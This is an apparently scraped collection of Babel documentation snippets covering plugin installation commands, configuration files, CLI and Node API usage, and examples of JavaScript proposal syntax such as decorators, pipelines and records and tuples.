LANGUAGE: html
CODE:
<script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

----------------------------------------

TITLE: Using Decimal in Babel 7.11.0
DESCRIPTION: Parser support for the Decimal proposal.

LANGUAGE: JavaScript
CODE:
console.assert(0.1m + 0.2m === 0.3m);

----------------------------------------

TITLE: Installing React JSX Source Transform Plugin
DESCRIPTION: NPM command to install the plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-react-jsx-source

----------------------------------------

TITLE: Applying @babel/plugin-syntax-typescript with Babel Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use the @babel/plugin-syntax-typescript plugin with Babel's Node API for code transformation.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-typescript"],
});

----------------------------------------

TITLE: Configuring Babel Plugin in JSON
DESCRIPTION: Configuration example showing how to enable the logical assignment operators transform plugin in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-logical-assignment-operators"]
}

----------------------------------------

TITLE: Embedding Twitter Tweet in Markdown
DESCRIPTION: This code snippet demonstrates how to embed a Twitter tweet in a Markdown file using HTML blockquote and script tags.

LANGUAGE: markdown
CODE:
<blockquote class="twitter-tweet" data-cards="hidden" data-lang="en"><p lang="en" dir="ltr">According to BigQuery there&#39;s 110,000 websites using <a href="https://twitter.com/babeljs?ref_src=twsrc%5Etfw">@babeljs</a>. (At least using the classes plugin). <a href="https://t.co/kOxlLsFKPX">pic.twitter.com/kOxlLsFKPX</a></p>&mdash; Sebastian McKenzie (@sebmck) <a href="https://twitter.com/sebmck/status/911336494824132608?ref_src=twsrc%5Etfw">September 22, 2017</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

----------------------------------------

TITLE: Configuring RequireJS Paths for Babel Integration
DESCRIPTION: Configuration example showing how to set up RequireJS paths to enable Babel transpilation. Required paths include es6 plugin, babel standalone, and the module resolver plugin.

LANGUAGE: javascript
CODE:
paths: {
    es6: '...node_modules/requirejs-babel/es6',
    babel: '...node_modules/@babel/standalone/babel.min',
    'babel-plugin-module-resolver': '...node_modules/babel-plugin-module-resolver-standalone/index'
  }

----------------------------------------

TITLE: Installing @babel/plugin-syntax-async-generators via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-async-generators Babel plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-syntax-async-generators

----------------------------------------

TITLE: Demonstrating Function Sent Usage in JavaScript
DESCRIPTION: This example shows how the function.sent proposal works in a generator function, and how it is roughly compiled by Babel.

LANGUAGE: JavaScript
CODE:
function* generator() {
  console.log("Sent", function.sent);
  console.log("Yield", yield);
}

const iterator = generator();
iterator.next(1); // Logs "Sent 1"
iterator.next(2); // Logs "Yield 2"

LANGUAGE: JavaScript
CODE:
let generator = _skipFirstGeneratorNext(function*() {
  const _functionSent = yield;
  console.log("Sent", _functionSent);
  console.log("Yield", yield);
});

const iterator = generator();
iterator.next(1); // Logs "Sent 1"
iterator.next(2); // Logs "Yield 2"

----------------------------------------

TITLE: Configuring Babel for New Decorators Proposal
DESCRIPTION: This JSON configuration enables the new decorators proposal in Babel by setting the version to '2021-12' in the @babel/plugin-proposal-decorators plugin options.

LANGUAGE: JSON
CODE:
{
  "plugins": [
    ["@babel/plugin-proposal-decorators", {
        "version": "2021-12"
    }]
  ]
}

----------------------------------------

TITLE: YAML Front Matter Configuration for Babel Blog Post
DESCRIPTION: YAML configuration block defining metadata for a Jekyll blog post about Babel 7 migration, including layout, title, authors, date, categories, and JavaScript dependencies.

LANGUAGE: yaml
CODE:
layout: post
title:  "Upgrade to Babel 7 (moved)"
authors: [sven, henry]
date:   2017-02-29 11:00:00
categories: announcements
share_text: "Upgrade to Babel 7"
third_party_js:
- https://platform.twitter.com/widgets.js
custom_js_with_timestamps:
- docs.js

----------------------------------------

TITLE: Applying @babel/plugin-syntax-export-default-from via Node API
DESCRIPTION: JavaScript code to use the @babel/plugin-syntax-export-default-from plugin with Babel's Node API for code transformation.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-export-default-from"]
});

----------------------------------------

TITLE: Configuring babel-preset-env for Node.js
DESCRIPTION: Example configuration for babel-preset-env targeting the current Node.js version.

LANGUAGE: JavaScript
CODE:
{
  "presets": [
    ["env", {
      "targets": {
        "node": "current"
      }
    }]
  ]
}

----------------------------------------

TITLE: Installing Babel Decorator Syntax Plugin via NPM
DESCRIPTION: Command to install the @babel/plugin-syntax-decorators plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-decorators

----------------------------------------

TITLE: Using Namespaced Transformers in Shell
DESCRIPTION: Shows how to use the new namespaced transformers feature to blacklist all ES7 transformers using a simple command line argument.

LANGUAGE: Shell
CODE:
$ 6to5 --blacklist es7

----------------------------------------

TITLE: Import babel-polyfill
DESCRIPTION: Example of importing babel-polyfill in source code.

LANGUAGE: JavaScript
CODE:
import "babel-polyfill";

----------------------------------------

TITLE: Setting Cache Path Environment Variable
DESCRIPTION: Shell command demonstrating how to specify a custom cache location using BABEL_CACHE_PATH

LANGUAGE: shell
CODE:
BABEL_CACHE_PATH=/foo/my-cache.json babel-node script.js

----------------------------------------

TITLE: Using Static Private Methods in Babel 7.4.0
DESCRIPTION: Support for static private methods, part of the static class features proposal.

LANGUAGE: JavaScript
CODE:
class Dog {
  static #register() { /* ... */ }
}

----------------------------------------

TITLE: Import Reflection Syntax Example in JavaScript
DESCRIPTION: Demonstrates the import reflection syntax that this plugin enables Babel to parse.

LANGUAGE: javascript
CODE:
import module foo from "./foo.wasm";

----------------------------------------

TITLE: Using Babel Plugin via CLI
DESCRIPTION: Shows the command line instruction to use the named capturing groups plugin with Babel CLI.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-named-capturing-groups-regex script.js

----------------------------------------

TITLE: Configuring Metalsmith Babel Plugin via CLI
DESCRIPTION: This snippet shows how to configure the metalsmith-babel plugin in the metalsmith.json file for CLI usage. It demonstrates setting Babel options, specifically using the @babel/preset-env preset.

LANGUAGE: JavaScript
CODE:
{
  "plugins": {
    "metalsmith-babel": {
      // babel options
      "presets": ["@babel/preset-env"]
    }
  }
}

----------------------------------------

TITLE: Adding Webpacker Gem to Rails Project
DESCRIPTION: This snippet shows how to add the Webpacker gem to a Rails project's Gemfile. This is the first step in integrating Webpacker into a Rails application.

LANGUAGE: ruby
CODE:
# Gemfile
gem 'webpacker'

----------------------------------------

TITLE: Using @babel/standalone with inline script in HTML
DESCRIPTION: Demonstrates how to use @babel/standalone to compile and execute an inline script with type 'text/babel'.

LANGUAGE: html
CODE:
<div id="output"></div>
<!-- Load Babel -->
<script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
<!-- Your custom script here -->
<script type="text/babel">
  const getMessage = () => "Hello World";
  document.getElementById("output").innerHTML = getMessage();
</script>

----------------------------------------

TITLE: Using @babel/standalone with inline script in HTML
DESCRIPTION: Demonstrates how to use @babel/standalone to compile and execute an inline script with type 'text/babel'.

LANGUAGE: html
CODE:
<div id="output"></div>
<!-- Load Babel -->
<script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
<!-- Your custom script here -->
<script type="text/babel">
  const getMessage = () => "Hello World";
  document.getElementById("output").innerHTML = getMessage();
</script>

----------------------------------------

TITLE: Installing Babel and Core Dependencies with npm or Yarn
DESCRIPTION: This command installs babel-loader and @babel/core as development dependencies. These are essential packages for using Babel in a project, typically for transpiling modern JavaScript into backwards-compatible versions.

LANGUAGE: shell
CODE:
npm install --save-dev babel-loader @babel/core

----------------------------------------

TITLE: Installing @babel/plugin-syntax-export-default-from via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-export-default-from plugin using npm package manager.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-export-default-from

----------------------------------------

TITLE: Optional Catch Binding Transform
DESCRIPTION: Example showing how optional catch binding gets transformed to use an unused parameter.

LANGUAGE: JavaScript
CODE:
try {
  throw 0;
} catch {
  doSomethingWhichDoesNotCareAboutTheValueThrown();
}

----------------------------------------

TITLE: Implementing Babel Function Bind Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the function bind syntax plugin programmatically through Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-function-bind"]
});

----------------------------------------

TITLE: Checking Feature Support with @babel/helper-compilation-targets in JavaScript
DESCRIPTION: This snippet demonstrates how to use the isRequired utility from @babel/helper-compilation-targets to check if a specific feature (object-rest-spread) is supported for given compilation targets.

LANGUAGE: javascript
CODE:
import { isRequired } from "@babel/helper-compilation-targets";

module.exports = api => {
  // Check if the targets have native object-rest-spread support
  const objectRestSpreadSupported = !isRequired(
    "transform-object-rest-spread",
    api.targets()
  );
};

----------------------------------------

TITLE: Babel CLI Usage
DESCRIPTION: Demonstrates how to use the do expressions plugin via Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-proposal-do-expressions script.js

----------------------------------------

TITLE: Transforming Record and Tuple syntax with polyfill import
DESCRIPTION: Example of how the plugin transforms Record and Tuple syntax when importPolyfill option is set to true, importing from @bloomberg/record-tuple-polyfill.

LANGUAGE: javascript
CODE:
let a = #[1, 2, 3];

// ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇

import { Tuple as _Tuple } from "@bloomberg/record-tuple-polyfill";

let a = _Tuple(1, 2, 3);

----------------------------------------

TITLE: Disabling Cache Environment Variable
DESCRIPTION: Shell command showing how to disable Babel's cache using BABEL_DISABLE_CACHE

LANGUAGE: shell
CODE:
BABEL_DISABLE_CACHE=1 babel-node script.js

----------------------------------------

TITLE: Using Instance Private Accessors in Babel 7.3.0
DESCRIPTION: Support for instance private accessors, part of the private methods proposal.

LANGUAGE: JavaScript
CODE:
class Dog {
  get #randomId() { return Math.random(); }
}

----------------------------------------

TITLE: Installing Pipeline Operator Syntax Plugin
DESCRIPTION: Command to install the @babel/plugin-syntax-pipeline-operator package using npm or yarn.

LANGUAGE: shell
CODE:
npm install @babel/plugin-syntax-pipeline-operator

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: npm command to install the import reflection syntax plugin as a dev dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-import-reflection

----------------------------------------

TITLE: Installing Sprockets Dependencies in Ruby Gemfile
DESCRIPTION: This snippet shows the Gemfile configuration for adding Sprockets and Sprockets-bumble_d gems to a Ruby project. These gems are likely used for asset compilation and management in the Babel project.

LANGUAGE: ruby
CODE:
# Gemfile
gem "sprockets"
gem "sprockets-bumble_d"

----------------------------------------

TITLE: Enabling Babel in Duo via CLI
DESCRIPTION: This snippet shows how to use the Duo CLI to enable Babel integration. It uses the --use flag to specify the duo-babel plugin.

LANGUAGE: sh
CODE:
duo --use duo-babel

----------------------------------------

TITLE: Using @babel/preset-stage-0 via Babel CLI
DESCRIPTION: Command to use @babel/preset-stage-0 when transpiling a JavaScript file using the Babel CLI.

LANGUAGE: shell
CODE:
babel script.js --presets @babel/preset-stage-0

----------------------------------------

TITLE: Using babel-plugin-minify-simplify via Babel CLI
DESCRIPTION: Demonstrates how to use the minify-simplify plugin with the Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins minify-simplify script.js

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the type constructor minification plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install babel-plugin-minify-type-constructors --save-dev

----------------------------------------

TITLE: Configuring Sprockets BumbleD in Ruby Application
DESCRIPTION: Sets up Sprockets BumbleD configuration in a Rails application's config/application.rb file. Extends the DSL and configures the Babel version to use for processing JavaScript assets.

LANGUAGE: ruby
CODE:
# config/application.rb
extend Sprockets::BumbleD::DSL

configure_sprockets_bumble_d do |config|
  config.babel_config_version = 1
end

----------------------------------------

TITLE: Configuring Babel to use class properties syntax plugin
DESCRIPTION: JSON configuration for babel.config.json file to enable the @babel/plugin-syntax-class-properties plugin.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-class-properties"]
}

----------------------------------------

TITLE: Configuring Babel Parser for Smart Pipeline Operator
DESCRIPTION: Demonstrates how to configure @babel/parser to enable parsing of the Smart Pipeline Operator proposal by passing the appropriate options.

LANGUAGE: JavaScript
CODE:
const ast = babel.parse(code, {
  plugins: [
    ["pipelineOperator", { proposal: "smart" }]
  ]
})

----------------------------------------

TITLE: Installing @babel/plugin-syntax-unicode-sets-regex via npm
DESCRIPTION: This command installs the @babel/plugin-syntax-unicode-sets-regex plugin as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-unicode-sets-regex

----------------------------------------

TITLE: Using Babel JSON Strings Transform via Node API
DESCRIPTION: Shows how to use the plugin programmatically through Babel's Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-json-strings"],
});

----------------------------------------

TITLE: Installing @babel/plugin-syntax-class-properties via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-class-properties Babel plugin using npm package manager.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-class-properties

----------------------------------------

TITLE: Class Transform Example - With Runtime
DESCRIPTION: Transformed class code using @babel/runtime-corejs2, showing modular helper import

LANGUAGE: javascript
CODE:
var _classCallCheck = require("@babel/runtime-corejs2/helpers/classCallCheck");

var Circle = function Circle() {
  _classCallCheck(this, Circle);
};

----------------------------------------

TITLE: Configuring Babel Plugin in JSON Configuration File
DESCRIPTION: JSON configuration to add the Safari class field initializer scope bugfix plugin to Babel's plugin list in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-bugfix-safari-class-field-initializer-scope"]
}

----------------------------------------

TITLE: Configuring Babel to use class static block syntax plugin
DESCRIPTION: JSON configuration for enabling the @babel/plugin-syntax-class-static-block plugin in a Babel project.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-class-static-block"]
}

----------------------------------------

TITLE: Using Babel Plugin via CLI
DESCRIPTION: This snippet shows how to use the @babel/plugin-transform-react-constant-elements plugin via the Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-react-constant-elements script.js

----------------------------------------

TITLE: Installing AVA Babel Package via NPM
DESCRIPTION: Adds @ava/babel as a development dependency to the project using npm. This package enables Babel integration with the AVA testing framework for transpiling test files.

LANGUAGE: shell
CODE:
npm install --save-dev @ava/babel

----------------------------------------

TITLE: Installing Babel 7 with Gulp Integration
DESCRIPTION: NPM command to install Babel 7 core package and gulp-babel as development dependencies. This setup enables JavaScript transpilation in Gulp build processes.

LANGUAGE: sh
CODE:
# Babel 7
npm install --save-dev gulp-babel @babel/core

----------------------------------------

TITLE: Configuring Mocha 8 with Babel Register
DESCRIPTION: Configuration for .mocharc.yaml to enable Babel compilation in Mocha 8 tests using @babel/register

LANGUAGE: yaml
CODE:
require:
  - '@babel/register'

----------------------------------------

TITLE: Using Babel Plugin via CLI
DESCRIPTION: Command line usage for applying the async do expressions syntax plugin to a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-async-do-expressions script.js

----------------------------------------

TITLE: Updating Babel Config to Remove Proposal Plugins
DESCRIPTION: Shows how to update Babel configuration to remove now-unnecessary proposal plugins for nullish coalescing and optional chaining.

LANGUAGE: JSON
CODE:
{
  "presets": [
    ["@babel/env", { "targets": ["last 2 versions"] }]
  ],
  "plugins": [
-   "@babel/proposal-optional-chaining",
-   "@babel/proposal-nullish-coalescing-operator"
  ]
}

----------------------------------------

TITLE: Enabling Babel Support in AVA Configuration (JSON)
DESCRIPTION: This JSON configuration snippet demonstrates how to enable Babel support in the AVA testing framework. It sets the 'babel' option to true within the 'ava' configuration object.

LANGUAGE: json
CODE:
{
  "ava": {
    "babel": true
  }
}

----------------------------------------

TITLE: Applying Unicode Sets Regex Syntax Plugin with Babel Node API
DESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-syntax-unicode-sets-regex plugin programmatically with Babel's Node API to transform code.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-unicode-sets-regex"],
});

----------------------------------------

TITLE: Installing Babel Numeric Separator Plugin
DESCRIPTION: Command to install the numeric separator plugin using npm or yarn.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-numeric-separator

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line interface command for using the minify-replace plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins minify-replace script.js

----------------------------------------

TITLE: Using Babelify via CLI
DESCRIPTION: Command line usage of Browserify with Babelify transform to bundle JavaScript files

LANGUAGE: shell
CODE:
browserify script.js -t babelify --outfile bundle.js

----------------------------------------

TITLE: Class Transform Example - Original Code
DESCRIPTION: Simple JavaScript class definition before Babel transformation

LANGUAGE: javascript
CODE:
class A {}

----------------------------------------

TITLE: Applying Babel Plugin Programmatically via Node.js API
DESCRIPTION: JavaScript code snippet demonstrating how to use the Safari class field initializer scope bugfix plugin with Babel's Node.js API for code transformation.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-bugfix-safari-class-field-initializer-scope"],
});

----------------------------------------

TITLE: Plugin Execution Command
DESCRIPTION: Demonstrates how to execute the transformation with a specific NODE_ENV value.

LANGUAGE: shell
CODE:
NODE_ENV=development babel in.js --plugins transform-node-env-inline

----------------------------------------

TITLE: Plugin Execution Command
DESCRIPTION: Demonstrates how to execute the transformation with a specific NODE_ENV value.

LANGUAGE: shell
CODE:
NODE_ENV=development babel in.js --plugins transform-node-env-inline

----------------------------------------

TITLE: Using Do Expressions Syntax Plugin via Babel CLI
DESCRIPTION: Command line usage of the do expressions syntax plugin to process JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-do-expressions script.js

----------------------------------------

TITLE: Installing Babel Plugin via npm
DESCRIPTION: This snippet provides the npm command to install the @babel/plugin-transform-react-constant-elements plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-react-constant-elements

----------------------------------------

TITLE: Inserting OpenGraph Metadata in HTML
DESCRIPTION: This snippet adds OpenGraph metadata to the page header, specifically setting the site property for Twitter.

LANGUAGE: html
CODE:
<head>
  <meta property="og:site" content="@babeljs" />
</head>

----------------------------------------

TITLE: Installing duo-babel Development Package
DESCRIPTION: Installs the duo-babel package as a development dependency using npm package manager. The npm2yarn comment indicates this command can be converted to yarn format.

LANGUAGE: shell
CODE:
npm install --save-dev duo-babel

----------------------------------------

TITLE: Input Code Example for Minify Replace
DESCRIPTION: Sample input code showing usage of the __DEV__ identifier that will be replaced by the plugin.

LANGUAGE: javascript
CODE:
if (!__DEV__) {
  foo();
}
if (a.__DEV__) {
  foo();
}

----------------------------------------

TITLE: Demonstrating Babili Pronunciation Command
DESCRIPTION: Shell command showing how to pronounce Babili using the say command.

LANGUAGE: shell
CODE:
# sounds like "bah billy" or "Babadi" (from DBZ)
say Babili

----------------------------------------

TITLE: Setting Babel Options in Brunch Config
DESCRIPTION: Example configuration showing how to customize Babel compiler options in a Brunch config file. Demonstrates setting whitelist for specific features and formatting preferences. Note that filename and sourceMap options are handled internally by Brunch.

LANGUAGE: coffeescript
CODE:
plugins:
  babel:
    whitelist: ["arrowFunctions"]
    format:
      semicolons: false

----------------------------------------

TITLE: Installing Babel Async Do Expressions Syntax Plugin
DESCRIPTION: Command to install the @babel/plugin-syntax-async-do-expressions plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-async-do-expressions

----------------------------------------

TITLE: Hack-Style Pipeline Operator Usage
DESCRIPTION: Shows the syntax and compilation output of the new Hack-style pipeline operator feature with topic token usage.

LANGUAGE: javascript
CODE:
// Input
"World"
  |> `Hello, ${#}!`
  |> alert(#);

// output
var _ref, _ref2;

_ref2 = (_ref = "World", `Hello, ${_ref}!`), alert(_ref2);

----------------------------------------

TITLE: Installing Babel JSON Strings Syntax Plugin via NPM
DESCRIPTION: Command to install the @babel/plugin-syntax-json-strings plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-json-strings

----------------------------------------

TITLE: Custom Parser Integration
DESCRIPTION: Example of integrating a custom fork of the Babel parser as a plugin

LANGUAGE: JavaScript
CODE:
const parse = require("custom-fork-of-babel-parser-on-npm-here");

module.exports = {
  plugins: [
    {
      parserOverride(code, opts) {
        return parse(code, opts);
      },
    },
  ],
};

----------------------------------------

TITLE: Installing React.Core NuGet Package
DESCRIPTION: Installs the React.Core NuGet package which provides Babel support for .NET applications through ReactJS.NET

LANGUAGE: powershell
CODE:
Install-Package React.Core

----------------------------------------

TITLE: Installing Babel Runtime CoreJS2
DESCRIPTION: Command to install @babel/runtime-corejs2 as a project dependency using npm

LANGUAGE: shell
CODE:
npm install --save @babel/runtime-corejs2

----------------------------------------

TITLE: Using Babel Plugin via Command Line Interface
DESCRIPTION: This snippet shows how to use the Safari ID destructuring collision bugfix plugin with Babel's CLI. It demonstrates the command to transform a JavaScript file using this plugin.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-bugfix-safari-id-destructuring-collision-in-function-expression script.js

----------------------------------------

TITLE: Using Babel Export Namespace Plugin via CLI
DESCRIPTION: Command line interface usage to enable the export namespace syntax plugin when running Babel.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-export-namespace-from script.js

----------------------------------------

TITLE: Plugin Configuration with Class Properties
DESCRIPTION: Configuration example showing correct plugin ordering when used with other class feature plugins.

LANGUAGE: json
CODE:
{
  "plugins": [
    "@babel/plugin-transform-class-static-block",
    "@babel/plugin-transform-class-properties"
  ]
}

----------------------------------------

TITLE: Installing @babel/plugin-syntax-module-string-names via npm
DESCRIPTION: This command installs the @babel/plugin-syntax-module-string-names plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-syntax-module-string-names

----------------------------------------

TITLE: Installing Babel Loader with JSPM CLI
DESCRIPTION: Command to download and configure Babel as the transpiler for JSPM. This can be used to switch an existing project to use Babel.

LANGUAGE: sh
CODE:
jspm dl-loader --babel

----------------------------------------

TITLE: Installing Babel Core and Babelify Using NPM
DESCRIPTION: Command to install required Babel development dependencies including babelify transform plugin and Babel core package. These packages enable JavaScript code transpilation and Browserify transform support.

LANGUAGE: shell
CODE:
npm install --save-dev babelify @babel/core

----------------------------------------

TITLE: Using babel-plugin-console Macro for Enhanced Console Logging
DESCRIPTION: This example shows how to use the scope macro from babel-plugin-console to add enhanced console logging capabilities to a JavaScript function. It demonstrates the simplicity of importing and using macros.

LANGUAGE: JavaScript
CODE:
import scope from 'babel-plugin-console/scope.macro'

function add100(a) {
  const oneHundred = 100
  scope('Add 100 to another number')
  return add(a, oneHundred)
}

function add(a, b) {
  return a + b;
}

----------------------------------------

TITLE: ESLint Parser Configuration for Babel
DESCRIPTION: Example of configuring ESLint to use the new experimental worker entry point for @babel/eslint-parser.

LANGUAGE: javascript
CODE:
// .eslintrc.js
module.exports = {
  parser: "@babel/eslint-parser/experimental-worker"
};

----------------------------------------

TITLE: Configuring babel-preset-env for a specific Chrome version
DESCRIPTION: JSON configuration for babel-preset-env targeting Chrome version 60.

LANGUAGE: json
CODE:
{
  "presets": [
    [
      "env",
      {
        "targets": {
          "chrome": "60"
        }
      }
    ]
  ]
}

----------------------------------------

TITLE: Installing via NPM/Yarn
DESCRIPTION: Command to install the plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-proposal-explicit-resource-management

----------------------------------------

TITLE: Transforming For-Await Loop Example
DESCRIPTION: Shows how for-await-of loops are handled by the plugin.

LANGUAGE: javascript
CODE:
async function f() {
  for await (let x of y) {
    g(x);
  }
}

----------------------------------------

TITLE: Configuring Minify Replace Options in JavaScript
DESCRIPTION: Example configuration options for the minify-replace plugin, showing how to replace the __DEV__ identifier with a numeric literal value of 0.

LANGUAGE: javascript
CODE:
[
  {
    identifierName: "__DEV__",
    replacement: {
      type: "numericLiteral",
      value: 0,
    },
  },
]

----------------------------------------

TITLE: Installing lab-babel Development Dependency
DESCRIPTION: Command to install lab-babel as a development dependency in a JavaScript/Node.js project using either npm or yarn package managers. The npm2yarn directive suggests this will be converted to equivalent yarn syntax.

LANGUAGE: shell
CODE:
npm install --save-dev lab-babel

----------------------------------------

TITLE: Using @babel/preset-stage-2 via Babel CLI
DESCRIPTION: Command to use @babel/preset-stage-2 when transpiling a JavaScript file using the Babel CLI.

LANGUAGE: shell
CODE:
babel script.js --presets @babel/preset-stage-2

----------------------------------------

TITLE: Using Babel Plugin via CLI
DESCRIPTION: Shell command to run Babel with the V8 spread parameters bugfix plugin directly from command line

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-bugfix-v8-spread-parameters-in-optional-chaining script.js

----------------------------------------

TITLE: Plugin Installation via NPM
DESCRIPTION: Command to install the optional catch binding syntax plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-optional-catch-binding

----------------------------------------

TITLE: Applying @babel/preset-es2017 using Babel Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use @babel/preset-es2017 when transforming code with Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  presets: ["@babel/preset-es2017"]
});

----------------------------------------

TITLE: Using @babel/plugin-syntax-import-meta via Babel CLI
DESCRIPTION: Shell command to use the @babel/plugin-syntax-import-meta plugin with the Babel CLI for transforming a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-import-meta script.js

----------------------------------------

TITLE: Demonstrating Parser Error Recovery in Babel
DESCRIPTION: Example of using the new errorRecovery option in @babel/parser to handle multiple syntax errors.

LANGUAGE: javascript
CODE:
const input = `
let a = {
  __proto__: x,
  __proto__: y
}

let a = 2;
`;

parser.parse(input); // Throws "Redefinition of __proto__ property"

const ast = parser.parse(input, { errorRecovery: true });
ast.errors == [
  SyntaxError: "Redefinition of __proto__ property",
  SyntaxError: "Identifier 'a' has already been declared",
];

----------------------------------------

TITLE: Demonstrating Parser Error Recovery in Babel
DESCRIPTION: Example of using the new errorRecovery option in @babel/parser to handle multiple syntax errors.

LANGUAGE: javascript
CODE:
const input = `
let a = {
  __proto__: x,
  __proto__: y
}

let a = 2;
`;

parser.parse(input); // Throws "Redefinition of __proto__ property"

const ast = parser.parse(input, { errorRecovery: true });
ast.errors == [
  SyntaxError: "Redefinition of __proto__ property",
  SyntaxError: "Identifier 'a' has already been declared",
];

----------------------------------------

TITLE: Applying babel-plugin-minify-mangle-names with Node.js API
DESCRIPTION: This JavaScript snippet shows how to use the plugin programmatically with Babel's Node.js API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["minify-mangle-names"]
});

----------------------------------------

TITLE: Applying React JSX Self Transform via Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use the @babel/plugin-transform-react-jsx-self plugin with Babel's Node API for code transformation.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-react-jsx-self"],
});

----------------------------------------

TITLE: React Constant Elements Pure Expression Support
DESCRIPTION: Demonstration of how the transform-react-constant-elements plugin handles pure expressions for hoisting React elements.

LANGUAGE: javascript
CODE:
const OFFSET = 3;

var Foo = React.createClass({
  render: function () {
    return (
      <div tabIndex={OFFSET + 1} />
    );
  }
});

----------------------------------------

TITLE: TypeScript 4.7 Explicit Variance Annotations
DESCRIPTION: Shows TypeScript 4.7's explicit variance annotations for type arguments, used to guide the type checker when computing compatibility between different types.

LANGUAGE: TypeScript
CODE:
type Provider<out T> = () => T;
type Consumer<in T> = (x: T) => void;
type Mapper<in T, out U> = (x: T) => U;
type Processor<in out T> = (x: T) => T;

----------------------------------------

TITLE: Starting Babel Node REPL
DESCRIPTION: Commands to launch the Babel Node REPL using npx

LANGUAGE: shell
CODE:
npx babel-node

----------------------------------------

TITLE: Demonstrating Super Call Compilation in JavaScript
DESCRIPTION: Shows how calling super() inside a constructor is compiled normally versus in Loose Mode. Loose Mode produces cleaner and faster code but may not fully align with the spec.

LANGUAGE: JavaScript
CODE:
function Foo() {
  _get(Object.getPrototypeOf(Foo.prototype), "constructor", this).call(this);
}

LANGUAGE: JavaScript
CODE:
function Foo() {
  Bar.call(this);
}

----------------------------------------

TITLE: Installing Babel Transpiler via Ruby Gems
DESCRIPTION: Command to install the babel-transpiler Ruby gem which allows using Babel JavaScript transpiler functionality in Ruby projects.

LANGUAGE: shell
CODE:
gem install babel-transpiler

----------------------------------------

TITLE: Configuring @babel/preset-stage-2 in babel.config.json
DESCRIPTION: JSON configuration to enable @babel/preset-stage-2 in a Babel project's configuration file.

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-stage-2"]
}

----------------------------------------

TITLE: Implementing ES7 Class Properties in JavaScript
DESCRIPTION: Demonstrates the usage of class property initializers proposal, allowing direct property definition in class bodies without constructors.

LANGUAGE: javascript
CODE:
class Person {
  firstName = "Sebastian";
  static lastName = "McKenzie";
}

assert(new Person().firstName, "Sebastian");
assert(Person.lastName, "McKenzie");

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line usage for applying the optional catch binding syntax plugin to a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-optional-catch-binding script.js

----------------------------------------

TITLE: Configuring @babel/preset-es2017 in babel.config.json
DESCRIPTION: JSON configuration to include @babel/preset-es2017 in the Babel presets array.

LANGUAGE: json
CODE:
{
